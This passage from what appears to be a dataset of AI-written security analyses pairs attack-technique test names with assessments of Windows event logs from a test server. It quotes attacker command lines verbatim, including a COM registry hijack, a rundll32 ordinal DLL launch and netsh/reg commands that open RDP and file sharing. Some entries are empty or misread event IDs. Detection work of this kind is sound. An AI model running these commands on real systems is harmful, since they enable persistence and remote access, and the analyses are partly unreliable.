- **SUSPICIOUS:** The logs demonstrate activity that is irregular and potentially harmful, such as the PowerShell command used to disable secure desktop prompting. This, in conjunction with the simultaneous execution of system tools, warrants further in-depth investigation to confirm whether these actions were authorized or indicative of a compromise.

### Guidance:
1. **Investigate User Activity:** Determine if the user `admin_test` had a legitimate reason to execute the PowerShell script and perform system administration tasks.
2. **Review Change Management:** Verify if there were any authorized changes documented for modifying the registry related to secure desktop prompts.
3. **Monitor Network Activity:** Check for any anomaly or lateral movement attempts around the timeframe of these logs.
4. **Strengthen Monitoring:** Ensure that PowerShell logging is enabled at an enhanced level to capture more detailed script block information.

Further investigation should also include deeper forensic analysis of any files modified by these processes and a review of any external connectivity to rule out command and control activities."
mavinject - Inject DLL into running process,"### Detailed Analysis

InstallUtil HelpText method call,"### Detailed Analysis of the Windows Event Logs:

Upon review of the logs provided, we observe entries primarily from the PowerShell and Sysmon logs. Here is a detailed analysis:

#### Windows PowerShell Logs:

1. **PowerShell Execution:**
   - The logs indicate execution of PowerShell scripts that involve compiling or invoking assemblies:
   - The script `InstallUtilTestHarness.ps1` located in a temporary directory `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\` is being executed.
   - The script imports and attempts to execute a .NET assembly (`data.004.dll`) using `InstallUtil`, a utility commonly used for installing server applications.
   - The execution aims to validate a HelpText property, and mismatches in expected versus actual output are logged — suggestive of testing functionality, but also a possible indication of malicious intent to execute or validate potentially harmful payloads.

2. **Compiled Code Execution:**
   - The compilation and execution process (`Add-Type`) is being utilized to define types and interact with Windows API through P/Invoke mechanisms.
   - This behavior could be an indication of a living-off-the-land (LOL) strategy where built-in utilities are leveraged to execute potentially harmful code.

#### Sysmon Logs:

1. **Execution of Core Windows Utilities:**
   - There is notable execution of core utilities such as `powershell.exe`, `conhost.exe` (Console Host), `wevtutil.exe` (Event Log utility), and `InstallUtil.exe`.
   - The usage of such programs in quick succession could point towards an automated script or tool execution, potentially indicating preparation for a sophisticated attack.

2. **PowerShell as Parent Process:**
   - Multiple instances of PowerShell as a parent process for subsequent command executions indicate potential automated tasks or scripts.
   - The command line for PowerShell involves the execution of scripts in a format that is often seen in scripted or automated tasks.

3. **Process Injection and Execution:**
   - `csc.exe` and `cvtres.exe` usage indicates C# compiling processes, commonly used for runtime code invocation.
   - The process chain indicates that these are being executed by scripts and PowerShell, which is less common in normal operational environments outside of a development setting.

### Assessment and Resolution:

**Suspicious Indicators:**
- The benign appearance of executing scripts from a temp location and massive usage of `InstallUtil`, a tool often used in abuse scenarios for privilege escalation or persistent backdoor installation.
- The usage of PowerShell and its tight integration with .NET assemblies adds to the suspicious activity, typical of a post-exploitation scenario utilizing a LOL technique.

**Findings:**
- The heavy use of PowerShell along with `InstallUtil` and the key access of Windows APIs can suggest the deployment or testing of potential malicious code.
- Each action one could expect in standard software behavior, however, the context of execution from temporary directories and the assembly validation through a HelpText property is unorthodox.

### Recommendation:

Resolution: **SUSPICIOUS**

The activity observed through these logs is decidedly suspicious. While not definitively malicious without further corroboration (e.g., context, confirmation of authorized use or intent), it strongly suggests unauthorized or unexpected testing of code that resembles characteristics of malware deployment tactics.

**Guidance:**
- Audit and restrict allowed scripts and execution policies on PowerShell.
- Investigate user account `SERVER002\admin_test` for unusual activity or unauthorized use.
- Verify the legitimacy of the script `InstallUtilTestHarness.ps1` and related assemblies.

    - However, there is a suspicious entry involving the Windows `cmd.exe` executing a command to add a registry entry using `reg.exe`. The command is:
      ```
      REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f
      ```
      This entry attempts to register a non-existent DLL (`C:\IDontExist.dll`) in the Windows registry, which is a typical behavior of malware attempting to persist on a system by creating or modifying COM objects. This is an indicator of potentially malicious activity.

2. **System and Security Logs**:
    - The logs indicate time synchronization events, which appear typical and do not show evidence of being directly linked to malicious activity.

3. **Application Logs**:
    - The entries predominantly feature entries indicating the stopping of services related to edge updates, which is routine during updates and does not suggest suspicious behavior.

**Assessment**:
- The attempted modification of the registry to reference a non-existent DLL is particularly concerning. This behavior is often indicative of malware trying to create a persistence mechanism or execute code through the registry. It stands out as a significant indicator of potential compromise.

**Resolution**: Based on the command-line registry modification attempt utilizing `cmd.exe` and `reg.exe`, the activity observed in the logs can be classified as **MALICIOUS**. It is advised to further investigate the system for other indicators of compromise, scan for malware, and review user actions around the near time frame of the logged event. Additionally, consider isolating the system and conducting a forensic analysis to ensure no malicious components were successfully installed or executed."
Compile After Delivery using csc.exe,"Upon analyzing the provided logs, here are the findings:

### System and Application Logs:
- **Windows Update Events:** These logs contain Windows Update activities (EventID 43 and 44), which show updates related to Microsoft Defender Antivirus being applied. These activities appear regular and routine as part of ongoing system maintenance and security updates.

### Security Logs:
- **Credential Logon and Privilege Events:**
  - **EventID 4634, 4624, 4672:** The logs indicate multiple logon events initiated by the user `admin_test` using NTLM authentication from IPs `192.168.0.102` and `fe80::e3b5:5371:12a8:9c77`. EventID 4672 lists high privileges tokens, indicative of admin-level operations.
  - **EventID 5379:** Multiple attempts to read credentials from a Microsoft Account with return code 3221226021, which indicates an access violation or failure. Although this seems concerning, the absence of successful credential access reduces its severity.

### Sysmon Logs:
- **Process Creation Activity:**
  - **PowerShell Execution (EventID 5):** `powershell.exe` executed by `admin_test`, common in both benign and potentially malicious activities. However, the direct context or command isn't captured.
  - **Unidentified Process (EventID 5):** There is an entry for an unknown process, which requires further inspection to ensure it’s not part of malicious activity.
  - **Execution of `wevtutil.exe` and `conhost.exe`:** Reflects typical operations for log management, but frequent execution should be reviewed to verify if it’s part of automation or misuse.
  - **`cmd.exe` with `csc.exe` Compilation:** `cmd.exe` executing `csc.exe` to compile a C# (calc.cs) file in a temporary path (C:\Windows\Temp) stands out as unusual in normal operational environments, indicating potential script or malware compilation.
  - **Usage of system utilities (`hostname.exe`, `whoami.exe`):** These are legitimate processes but could potentially be used for reconnaissance if misused.
  - **System Update Executions (`wuauclt.exe`, `AM_Delta.exe`):** Normal update processes as observed.

### Conclusion:
The presence of `csc.exe` compilation activity within temporary file paths (`data.004.exe`) combined with PowerShell invocations and an unknown process indicates activity that is uncommon in general system operations. This could be indicative of malware trying to compile and execute code on the system, particularly when it involves temporary folders, which are often used by threat actors to avoid detection.

### Assessment:
**Resolution: SUSPICIOUS**

- **Threats or Risks:** Potential scripting or malware activity involving compilation and execution of unknown scripts likely for unauthorized tasks. 
- **Guidance:** Further investigation is recommended:
  - Conduct a thorough review of any scripts and compiled files (e.g., `calc.cs`, `data.004.exe`) to ensure they don’t contain malicious code. 
  - Verify the intent behind the `powershell.exe` usage and unknown process execution.
  - Monitor network traffic for any anomalies originating from the mentioned IPs.
  - Inspect system changes and user activities related to `admin_test` for unauthorized escalations or operations.
- Consider isolating the system until it is verified to be cleansed of potential threats."
Rundll32 with Ordinal Value,"### Detailed Analysis:

#### Summary:
After examining the Windows event logs provided, there's evidence suggesting potential malicious activity primarily related to suspicious process executions and privilege changes. The key concerns stem from specific command executions, usage of certain privileges by a suspicious user, and the context of these activities.

#### Suspicious/Anomalous Behavior:

1. **Suspicious User Activity**:
   - The user `SERVER002\admin_test` was involved in high privilege activities such as SeDebugPrivilege and SeTakeOwnershipPrivilege (Event ID 4672). These privileges can be exploited by attackers to manipulate system-level processes or services.

2. **Suspicious Process Executions**:
   - There were multiple executions of legitimate Windows utilities (like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`) under the context of the `admin_test` user. Notably, the `cmd.exe` process executed a command involving `rundll32.exe` with a DLL located in a temporary user directory:
     ```
     ""cmd.exe"" /c rundll32.exe ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.010\\bin\\AllTheThingsx64.dll"",#2
     ```
     - This specific use of `rundll32.exe` is often associated with executing potentially harmful software or scripts disguised as legitimate.

3. **Privilege Escalation**:
   - Certain logs show the `admin_test` account, a non-system account, acquiring system-level privileges and executing processes typically unnecessary for standard operations (e.g., `seSecurityPrivilege`, `seTakeOwnershipPrivilege`).

4. **Network-Based Logons**:
   - There are network-based logons (Logon Type 3) attributed to `admin_test` from an external machine (`DESKTOP-3HL5B2P` with IP `192.168.0.102`), which could indicate remote access or movement within the network.

#### Indicators of Compromise:
- Execution of DLLs from temporary directories using `rundll32.exe`.
- Acquiring and using excessive privileges that are potentially unnecessary for typical admin users.
- Unusual frequency of command execution using system utilities by the `admin_test`.

### Assessment:
- **Resolution: MALICIOUS**

The logs contain clear indicators of potentially malicious activity. The combination of high privilege assignments, unusual execution of process utilities from a user-level context, and the use of `rundll32.exe` with a DLL from a temporary directory strongly suggest potential exploitation or an active breach.

### Guidance on How to Proceed:
- **Immediate Actions:**
  - **Isolate the Affected Host:** Disconnect `Server002` from the network to prevent further propagation of the potential threat.
  - **Review `admin_test` Activities:** Conduct an in-depth review of the activities associated with the `admin_test` account. Consider resetting credentials or disabling the account temporarily.
  - **Inspect External Connections:** Analyze network traffic logs to understand the interactions between `Server002` and `DESKTOP-3HL5B2P`.

- **Further Investigation:**
  - **Malware Analysis:** Perform a detailed file system analysis on `Server002`. Particularly focus on files present in temporary directories and scan the DLL for known threats.
  - **Log Review:** Continue reviewing additional logs, such as firewall or antivirus logs, for signs of data exfiltration or other anomalies.

- **Remediation:**
  - **Patch and Update Systems:** Ensure all systems and applications are fully updated with the latest security patches.
  - **Enhance Monitoring:** Implement additional monitoring for critical assets and apply stricter access controls and user activity monitoring."
ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,"Upon analyzing the provided Windows event logs, the following observations and analysis have been made:

1. **Process Executions**:
   - Multiple instances of well-known legitimate Windows processes such as `powershell.exe`, `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `plink.exe`, and others are noted.
   - A significant concern arises from the command executed using `cmd.exe` which invokes `plink.exe`. The command uses SSH (`-ssh`) to connect to a remote host `file.local` with root credentials (`-l ""root""`) and a plaintext password (`-pw ""pass""`). The use of `plink.exe` with root credentials and a clear text password is highly unusual and suggests a possible data exfiltration or unauthorized remote access attempt.

2. **Privilege Usage**:
   - The logs contain multiple event 4672 entries, indicating that accounts are receiving privileged access. This is typical in system processes, especially with SYSTEM accounts, but when coupled with the `plink.exe` activity, it could be of concern.

3. **Security Events**:
   - Security logs show multiple 4624 logins indicating successful logon entries likely for system services with a logon type `5`, which is typical for service startups.
   - There are also credential validation failures (`5379`) related to MicrosoftAccount and WindowsLive. These failures might need further context but, on their own, appear benign as they can occur due to configuration or connectivity issues and aren’t inherently malicious.

4. **Indicators of Compromise**:
   - The presence of `cmd.exe` invoking `plink.exe` with a plaintext password in its command line is a typical indicator of compromise. `Plink.exe` is a known tool for SSH services and, when used in this manner, often indicates unauthorized access or data exfiltration attempts.

5. **Other Observations**:
   - Routine Windows processes like `svchost.exe`, `TiWorker.exe`, `TrustedInstaller.exe` reflect typical operations for system maintenance and updates, appearing benign.

**Assessment**:
The log entries indicate a potential security threat due to the execution of a command from `cmd.exe` invoking `plink.exe` with root credentials and plaintext password, which is highly irregular and typically indicative of malicious activity. This specific event suggests someone might be trying to establish an unauthorized connection to an external system.

**Resolution**: 
- **MALICIOUS**: The behavior and context surrounding `plink.exe` usage reflect known attack patterns that warrant this categorization.

**Guidance**:
- Immediate containment actions should be taken to isolate the system (Server002) from the network to prevent further unauthorized access or data exfiltration.
- Perform a thorough forensic analysis to determine the full scope of the compromise and ensure no backdoors have been installed.
- Review and change all credentials used on the system, especially those that may have been compromised.
- Implement additional security controls to prevent plaintext password usage and monitor for abnormal command executions in the future."
Service ImagePath Change with reg.exe,"### Detailed Analysis of Windows Event Logs

Upon analyzing the provided Windows event logs, here are the key observations related to suspicious or anomalous behavior:

#### Sysmon Log Observations:
1. **PowerShell Execution**:
   - Process `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` executed under the user `SERVER002\admin_test`. The log indicates usage of PowerShell but does not provide command-line arguments. If such details were obfuscated or executed with a script that is unconventional or unexpected, it could indicate malicious activity.

2. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**:
   - The `wevtutil.exe` and `conhost.exe` are repeatedly executed, which might indicate log manipulation efforts. `wevtutil.exe` can be used for event log clearing or exporting, which are suspicious actions if not justified by administrative tasks.

3. **Suspicious `cmd.exe` and `reg.exe` Activity**:
   - `cmd.exe` executed with a command-line argument to add a service registry key (`HKLM\SYSTEM\CurrentControlSet\Services\calcservice`) with an image path pointing to the `cmd.exe`. This action is particularly suspicious as it may indicate an attempt to establish persistence on the system through a malicious service.

4. **Usage of Known Tools**:
   - Execution of `whoami.exe` and `hostname.exe` under the same user may suggest reconnaissance to gather information about the machine and logged-in users.

#### Application Log Observations:
- The entry from the **Software Protection Platform Service** logs typical activity related to software licensing, which does not indicate compromise by itself but should be cross-referenced for any abnormal activity around the same timestamps.

### Assessment of the Situation
- **Multiple indicators** in the Sysmon logs suggest possible malicious activity:
  - The creation of a suspicious service via registry modification using `reg.exe`.
  - Repeated execution of process management and event utility binaries (`conhost.exe`, `wevtutil.exe`), potentially indicating attempts at evasion or persistence.
  - PowerShell execution without detailed command-line context to determine intent.

### Conclusion
- **Resolution**: **MALICIOUS**
  - The registry modification to create a suspicious service and frequent execution of tools related to system status, potentially being used for persistence or information gathering, point towards malicious intent.

### Guidance on How to Proceed
- **Immediate Actions**:
  - **Isolate** the affected system (`Server002`) from the network to prevent further compromise or lateral movement.
  - **Conduct a thorough investigation** into command-line executions from PowerShell sessions using available logs or endpoint security solutions to capture exact commands.
  - **Review Security Event Logs and Anti-malware alerts** for any signs of further malicious activity or correlated alerts.
  - **Remove the suspicious service** and check for any scheduled tasks or services that may have been installed by unauthorized users.
  
- **Long-term Recommendations**:
  - **Strengthen PowerShell logging** to capture all command-line arguments and script block logs.
  - **Implement stricter monitoring** for sensitive commands executing processes like `cmd.exe`, `wevtutil.exe`, and `reg.exe`."
Microsoft.Workflow.Compiler.exe Payload Execution,"### Analysis of Windows Event Logs

Upon reviewing the provided Windows event log data focusing on the Sysmon, Security, Application, and PowerShell logs, I have identified the following points for analysis:

1. **Frequent Execution of PowerShell (Sysmon Logs)**
   - Multiple instances of PowerShell are being executed by the user `SERVER002\\admin_test`. Command lines are executed without clear indicators of malicious payloads or scripts, which may suggest either legitimate use or disguised activity. The execution of PowerShell scripting can be used in both legitimate administration tasks or as a vector for an attack.
   - The command specific of interest is:
     - `""powershell.exe"" & {C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\microsoft.workflow.compiler.exe \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data\\src\\data.xml\"" output.txt}` which results in a termination error. This could be due to a file being inaccessible, but further investigation is required.
   
2. **Microsoft Edge Update Executions (Sysmon Logs)**
   - Various executions of Microsoft Edge Update processes are observed. These processes show typical command line operations involving `/svc`, `/regsvc`, `/regserver`, and `/update`, potentially indicating a legitimate software update cycle.
   - Command lines involving paths like `C:\\Program Files (x86)\\Microsoft\\Temp\\` warrant closer inspection due to their temporary nature, potentially related to deployment or update processes.

3. **Windows System Processes and Security Logs**
   - High-level system processes executed under `NT AUTHORITY\\SYSTEM` with a normal pattern for logging in credentials, suggesting expected system operations.
   - Privileged tokens associated with the `SYSTEM` user are observed, aligning with the planned execution of system level updates and processes.
   
4. **Credentials Read Failures (Security Logs)**
   - Multiple failed attempts for reading Windows Live credentials by `admin_test` (`ReturnCode`=""3221225567"" indicating `STATUS_NOT_FOUND`), which could suggest an anomaly if not a result of misconfiguration or incorrect targeting in scripts or applications. This warrants basic verification of credential usage patterns.

5. **Application Errors (Application Logs)**
   - The process `microsoft.workflow.compiler.exe` terminated due to a `DirectoryNotFoundException`. This indicates potential misconfiguration or issues in the script or process design.
   - The associated entries in Windows Error Reporting correspond to this termination, providing no indicators of compromise but pointing toward a need for remediation in process handling.

### Assessment and Resolution
- **BENIGN**: All observed activities, such as PowerShell commands and logging events, are under common user contexts and involve legitimate system processes, including software updates involving Microsoft Edge. However, the recurrent failure in handling file paths through PowerShell and application crashes indicate the need for remediation of configuration or script errors but are not inherently malicious.
- **Recommendation**: Enable detailed logging and validation of configurations for processes initiating PowerShell executions, ensuring directories and scripts are correctly deployed and accessed. Further, review system update behaviors but expect such operations given routine software maintenance cycles.

**Resolution: BENIGN** - No conclusive malicious activity observed, but some system actions warrant further troubleshooting to resolve errors and improve process integrity."
Activities To Disable Secondary Authentication Detected By Modified Registry Value,"## Detailed Analysis

### 1. **Windows PowerShell Logs**

- **Observation:** Logs are empty, indicating no unusual PowerShell activities captured during this period. PowerShell misuse is often a key indicator of malicious behavior, and absence of such logs is initially non-concerning.

### 2. **Application Logs**

- **Observation:** 
  - EdgeUpdate service logs (EventID: 0) indicating service stop events are present. These events are typical for update services, which may pause or stop as part of routine updates.
  - Security-SPP events relate to software protection and license validation, showing no immediate signs of tampering or anomaly.

### 3. **System Logs**

- **Observation:** 
  - Multiple `Microsoft-Windows-Kernel-General` events related to system time adjustments are recorded. The adjustments seem automated as part of regular time synchronization with `time.windows.com`.
  - No unusual system-level errors or anomalies are noted that could suggest malicious interference.

### 4. **Sysmon Logs**

- **Observation:**
  - Multiple executions of `wevtutil.exe` and `conhost.exe` by the `admin_test` user are captured. These tools are legitimate Windows components used for event log management and console handling.
  - Multiple instances of `cmd.exe` and `reg.exe` involved in a registry modification (allowing/disabling secondary authentication devices), which might be misused in certain attack scenarios but is insufficient contextually without further evidence.
  - Normal `Microsoft Edge Update` operations are noted, aligning with the frequent `EdgeUpdate` service logs.

### 5. **Security Logs**

- **Observation:**
  - Logon/Logoff events, including `4624` (logon), `4634` (logoff), and `4672` (privilege assignment), are legitimate activities tied to the user `admin_test`.
  - `4672` event indicates high privilege access, common for administrative logons.

## Suspicious Indicators

- **Registry Modification via cmd.exe/reg.exe:** Although the registrar modifications are legitimate operations, changing the registry concerning secondary authentication factors can potentially be misused to undermine security settings.
  
- **High Privilege Access by admin_test:** Having multiple high-integrity operations from `admin_test`, particularly with privilege rights (e.g., SeDebugPrivilege), warrants verifying the necessity of actions performed under this account, especially considering there might be no immediate need for such extensive privileges.

## Assessment and Resolution

Based on the analysis, there are **suspicious activities** that warrant closer examination but are not conclusively malicious without further evidence:
- The registry modifications and high-level privilege allocation lack direct malicious intent but could be potentially leveraged in malicious scenarios.
- Regular review of the admin account activities (`admin_test`) and any related system changes should be carried out.

### **Resolution: SUSPICIOUS**

### **Guidance and Next Steps**
- **Investigate Further:** Review the purpose of registry changes and confirm legitimate needs.
- **Monitor Admin Accounts:** Increase monitoring on `admin_test`, especially when high-privileged rights are exercised or logs do not align with expected user activity.
- **Audit Usage:** Check the necessity of such privileges under the current operational policy to eliminate potential misuse.
- **Enhance Alerts:** Consider implementing alert triggers for registry operations related to security configurations.

The steps above should help prevent potential security breaches by ensuring that these anomalies are either confirmed as benign or appropriately managed."
Rundll32 execute payload by calling RouteTheCall,"Upon reviewing the provided logs, several observations can be made to assess potential indicators of malicious activity.

### Analysis:

1. **PowerShell Logs:**
   - The PowerShell logs indicate the execution of a command using `rundll32.exe`. Specifically, the command is invoking `zipfldr.dll` to route a call to launch `calc.exe`. This might seem unusual because `rundll32.exe` is commonly exploited for executing dynamically linked library (DLL) files for malicious purposes. However, the target application here is `calc.exe`, which is the Windows Calculator, typically considered benign.
   - Despite the benign target, this unconventional use of PowerShell to execute `rundll32.exe` warrants further examination because using system tools in unexpected ways can sometimes be indicative of an attempt to evade detection mechanisms or perform unauthorized actions.

2. **System Logs:**
   - There is no direct evidence of system-level alarms or changes that would suggest a compromise.
   - The system time was slightly adjusted, which is likely a normal synchronization event, primarily driven by standard Windows processes such as `svchost.exe`.

3. **Security Logs:**
   - Activities performed under the `LOCAL SERVICE` context appear to be standard system operations for time adjustment with no apparent oddities in the context of the times logged.
   - No alerts or audit failures are noted.

4. **Sysmon Logs:**
   - Several entries related to processes like `wevtutil.exe`, `conhost.exe`, and `whoami.exe`. These are generally benign Windows utilities.
   - Console operations and administrative checks appear to align with routine activities.

5. **Noteworthy Observations:**
   - The presence of multiple `wevtutil.exe` interactions, typically used for Windows Event Log management, could be benign, as they align with log management tasks. Nevertheless, extensive use of this utility combined with other suspicious events could suggest an attempt to clear or manipulate logs.
   - The PowerShell command and its use of `rundll32.exe` form the primary point of interest, albeit targeting `calc.exe` suggests non-malicious activity unless further context is discovered indicating altered or replaced binaries.

### Final Assessment:
Based on the logs presented, the activity can be categorized as **SUSPICIOUS**. Although the main command executed aims to invoke a benign application (calc.exe), the methodology employed—especially through PowerShell with `rundll32.exe`—is unconventional and potentially indicative of testing, misconfiguration, or an early-stage trial of a malware attack. In the absence of additional malicious indicators or compromise evidence, further investigation into the context and user accountability for this execution is advised, particularly verifying if this aligns with expected administrative tasks or documented changes.

### Guidance:
- Conduct a detailed review of the binary integrity of `calc.exe` and other system utilities involved (`rundll32.exe`, and `zipfldr.dll`).
- Verify with system administrators or the responsible account holder (`SERVER002\admin_test`) for intentional executions to confirm or discern the necessity of these commands.
- Configure alerts for similar future PowerShell command executions that utilize `rundll32.exe` to initiate other processes.
- Ensure antivirus definitions and threat detection solutions are current and capable of recognizing misuse of otherwise legitimate system utilities."
Mimic Ransomware - Allow Multiple RDP Sessions per User,"After a thorough review of the provided Windows event logs from Server002, here is a detailed analysis highlighting the activities observed:

### Analysis:

1. **Repeated Usage of `wevtutil.exe` and `conhost.exe`:**
   - **Observation:** The logs show multiple events of `wevtutil.exe` followed by `conhost.exe` being executed by user `SERVER002\admin_test`. These operations occur in quick succession.
   - **Reasoning:** `wevtutil.exe` is a legitimate system utility used to manage Windows event logs. However, frequent and automated usage can be a sign of log tampering or reconnaissance activities, aiming to clear logs or gather sensitive data.

2. **Execution of `cmd.exe` with Suspected Malicious Command:**
   - **Observation:** `cmd.exe` is executed with a command line indicating modification of the registry key `HKLM\System\CurrentControlSet\Control\Terminal Server` using `reg add`.
   - **Reasoning:** The registry modification changes `fSingleSessionPerUser`, which can alter how terminal services sessions are handled. This indicates a configuration change possibly to enable concurrent user sessions or to bypass certain restrictions, which is often a tactic used in lateral movement or maintaining persistence.

3. **Use of `hostname.exe` and `whoami.exe`:**
   - **Observation:** `hostname.exe` and `whoami.exe` are executed consecutively.
   - **Reasoning:** These utilities are typically used to gather system and user information. While not malicious on their own, combined with above activities, they can suggest a reconnaissance phase in an attack.

4. **Presence of Elevated Privileges:**
   - **Observation:** Event ID 4672 shows privileges including `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, etc., granted to `admin_test`.
   - **Reasoning:** These are high-level privileges allowing debugging and ownership changes, possibly indicating privilege escalation if not standard.

5. **Time Change Events:**
   - **Observation:** The logs indicate time being adjusted backwards, as captured in Event ID 4616.
   - **Reasoning:** Legitimate use could be for synchronization purposes; however, adjusting time can be used to manipulate event log timelines or evade detection.

### Assessment:

The logs present a series of events that align with potential reconnaissance and configuration manipulation activities indicative of preparation for further malicious actions or maintaining control over the host.

### Threat and Risk:

- **Risk Level:** High. The combination of registry modifications, log utility usage, and elevated privilege assignment suggests potentially unauthorized modifications and data gathering possibly preceding or part of an ongoing compromise.

### Guidance:

1. **Immediate Steps:**
   - Investigate and confirm whether the registry modification was a legitimate administrative task.
   - Verify any authorized use of `wevtutil.exe` commands and the reasons for privilege escalations.
   - Cross-examine if other endpoints exhibit similar behaviors, indicating lateral movement.

2. **Further Monitoring:**
   - Monitor user `admin_test` for any further abnormal activities.
   - Analyze network communications during the timeframe for unauthorized data transfers or connections.

3. **Security Measures:**
   - Consider implementing tighter access controls and monitoring on administrative accounts.
   - Review and tighten policies on command line usage and logging behaviors.

### Resolution:

Given the observed events, unusual registry changes, and the combination of high-privilege activities, the resolution is classified as:

- **MALICIOUS** - The logs indicate strong signs of unauthorized manipulation and potential preparation for a targeted attack or system control.

Immediate investigation and response are recommended to mitigate further risks."
CheckIfInstallable method call,"After reviewing the provided event logs, there are several aspects to consider from a security standpoint:
 
### Key Observations:
1. **PowerShell Activity**: 
   - There's activity involving ""powershell.exe"" with a command line script invoking a file from the temporary directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\data.004\\src\\InstallUtilTestHarness.ps1`). This script is attempting to perform operations that resemble software installation tests (`Invoke-BuildAndInvokeInstallUtilAssembly`). 
   - The execution of PowerShell scripts from temporary directories is often associated with suspicious activities, especially if these scripts are not part of regular administrative tasks or deployments.

2. **Process Creation Events**:
   - Several processes like `wevtutil.exe`, `csc.exe`, `cvtres.exe`, and `HOSTNAME.EXE` were spawned following PowerShell activity. While `wevtutil.exe` is used to manipulate event logs, `csc.exe` (C# Compiler) and `cvtres.exe` could be used in a benign context but might also be indicative of compilation steps within the attack chain for creating or modifying executables.
   
3. **NT AUTHORITY\SYSTEM Activity**:
   - A significant amount of activity attributed to `NT AUTHORITY\SYSTEM` includes processes related to Microsoft Edge update, which appears routine. However, the extensive command-line arguments and interactions are worth noting but align with legitimate processes for Edge maintenance.

4. **High Integrity Level Processes**:
   - Processes like `whoami.exe` and `HOSTNAME.EXE` running at high integrity indicate they have elevated privileges, but these operations performed by ""SERVER002\\admin_test"" suggest tasks common for a privileged account.

5. **Use of `conhost.exe`**:
   - Frequently observed in conjunction with PowerShell and other command-line utilities, `conhost.exe` usage is somewhat expected but can sometimes be abused for malicious command execution and redirection.
   
6. **Event Correlation and Timing**:
   - The logs exhibit a concentrated batch of activities occurring around the same time, which could be either a scripted sequence of tasks or an automated process.

### Assessment:
- **SUSPICIOUS**: The activity observed in the logs, especially around PowerShell execution from a temporary directory and related subprocess spawning, suggests that parts of the operation have a potentially malicious nature or are at least deviant from typical behavior expected on a server unless known maintenance was being performed.

### Guidance and Next Steps:
1. **Review of Scripts and Executables**: Analyze the contents of `InstallUtilTestHarness.ps1` and associated files in the TEMP directory to understand their purpose.
2. **User and Process Monitoring**: Monitor the activities of `SERVER002\\admin_test` to verify that it is legitimate. Verify if the account is subject to regular auditing, and its usage aligns with expected administrative tasks.
3. **Integrity Checks**: Conduct checks on binaries like `wevtutil.exe`, `csc.exe`, and `PowerShell.exe` for potential tampering and ensure they match expected hashes from trusted sources.
4. **Enhanced Logging and Monitoring**: Increase the logging level on critical systems to capture more granular details of process command lines and network connections.
5. **Review Edge Update Logs**: Considering the Edge update process extensively logs entry, ensure that this is part of scheduled updates and nothing malicious masquerades within legitimate task executions.

Given these points of analysis, the recommendation is to conduct a detailed investigation into the highlighted suspicious activities to ensure the host's integrity and security posture."
Allow SMB and RDP on Microsoft Defender Firewall,"### Analysis

In reviewing the provided logs, several points of interest stand out with potential indicators of suspicious behavior; however, further analysis is necessary to definitively determine whether malicious activity has occurred.

1. **Process Execution Patterns**: The logs show frequent invocations of `wevtutil.exe` and `conhost.exe` under the user `SERVER002\\admin_test`. Typically, `wevtutil.exe` is a legitimate Windows utility used for event log management, but repeated and frequent usage in a short time span could merit further examination. These two processes appear regularly in conjunction, which is not inherently suspicious, but can be exploited in certain threat actors' methodologies.

2. **Command Line Argument Analysis**: 
   - A `cmd.exe` process was initiated with the following command: `""cmd.exe"" /c netsh advfirewall firewall set rule group=""remote desktop"" new enable=Yes & netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes`. This command modifies the firewall rules to enable remote desktop and file and printer sharing, actions common in both legitimate administrative tasks and initial phases of malicious access attempts. Without additional context about why these changes are being made, this activity can be considered **suspicious**.

3. **Privilege Context and Integrity Levels**: 
   - The majority of the events run under the high integrity context of `SERVER002\\admin_test`, suggesting administrative level access which aligns with legitimate administrative use but also aligns with tactics of privilege escalation if such access is unwarranted.

4. **Time & Frequency of Events**: 
   - The events logged occur in a very condensed time frame, most spanning between `11:37:50` to `11:38:22`. Rapid execution of system utilities in this manner could represent a script or automated process.

5. **Edge Update Processes**: 
   - A series of logs pertain to the execution of `MicrosoftEdgeUpdate.exe` and related processes with the command lines suggesting updates. Although this aligns with routine Windows processes, ensuring these aren't proxies or Trojanized versions for malicious update installations is necessary.

### Threat/Risk Assessment

Currently, the logs primarily indicate **suspicious** activity rather than conclusively malicious. Key actions such as the enabling of remote desktop and printer/file sharing firewall rules without clear business justification, especially if these tasks were not scheduled or known to IT administrators, warrant further investigation. The clustered timing of process executions suggests automation or potentially scripted activity, which can either be legitimate management or a prelude or part of compromised behavior.

### Guidance and Next Steps

1. **Verify the Administrator Activity**: Confirm with IT staff whether these configurations and uses of tools like `wevtutil.exe` and adjustments to firewall settings align with standard operational procedures or ongoing administrative tasks.

2. **Network Activity Review**: Evaluate whether any unusual remote access patterns to `Server002` correspond with the timing of the firewall modifications.

3. **Endpoint Detection and Response**: Deploy or check existing endpoint detection tools for any anomalies or alerts during this time period, specifically focusing on known indicators of compromise and unusual process behaviors.

4. **User Account Validation**: Double-check the account `SERVER002\\admin_test` for unusual activity patterns or unauthorized access attempts around the event times logged. Ensure robust logging for this account is enabled going forward.

5. **Conduct a Comprehensive Scan**: Execute a full system scan with updated Antivirus/Antimalware software to rule out the presence of any malicious binaries or residual scripts.

Based on the current analysis, the logs qualify under **SUSPICIOUS** activity resolution requiring further investigation to rule out or confirm any malicious foothold or action."
attrib - Remove read-only attribute,"### Log Analysis:

**Indicators of Malicious Activity:**

1. **Frequent Execution of cmd.exe:**
   - Multiple instances of `cmd.exe` are executed with various command lines, primarily involving file attribute manipulations and directory creations. While the use of `cmd.exe` in itself is not suspicious, the usage pattern in this context could warrant further investigation as it may be an attempt to stage data or prepare the system for more complex operations.

2. **Use of attrib.exe:**
   - The logs show that `attrib.exe` was employed to modify file attributes, which could be used to hide files by setting them as read-only or hidden. Although this can be part of regular maintenance or scripting tasks, such activity may also be indicative of malicious intent, especially when executed under a high-integrity security context repeatedly and in rapid succession.

3. **Execution with High Integrity Level:**
